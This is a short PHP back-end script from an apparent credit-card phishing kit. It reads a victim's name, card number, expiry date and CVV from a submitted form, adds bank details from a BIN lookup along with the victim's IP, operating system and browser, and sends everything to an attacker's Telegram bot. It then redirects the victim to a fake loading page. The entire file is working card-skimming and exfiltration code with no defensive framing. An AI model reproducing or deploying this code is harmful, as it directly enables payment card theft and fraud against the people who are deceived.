<?php
include './tginfo.php';
include './agent.php';

$ip = getenv("REMOTE_ADDR");
$name = $_POST['name'];
$cc = $_POST['cc'];
$exp = $_POST['exp'];
$cvv = $_POST['cvv'];

// BIN Lookup
$bin = substr($cc, 0, 6);
$bin_info = json_decode(file_get_contents("https://lookup.binlist.net/$bin"), true);
$bin_data = '';
if (!empty($bin_info)) {
    $bin_data = "BIN: $bin\n🏢 Brand: {$bin_info['scheme']} 👀\n🔢 Type: {$bin_info['type']} 🧮\n🏦 Bank: {$bin_info['bank']['name']} 🏛️\n🌍 Country: {$bin_info['country']['name']} 🗺️\n";
}

if (!empty($name) && !empty($cc) && !empty($exp) && !empty($cvv)) {
    $coronamsg = "esdeath\n";
    $coronamsg .= "\n👦🏻 $name\n💳 $cc\n📅 $exp\n🔐 $cvv\n$bin_data\n🌍 $ip 🖥️ $user_os 🌐 $user_browser\n";

    $token = "$coronatoken";
    $data = ['text' => $coronamsg,'chat_id' => $coronachat,];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
    header("Location: ../loading03.php");
} else {
    header('Location: ../index.php');
}
?>
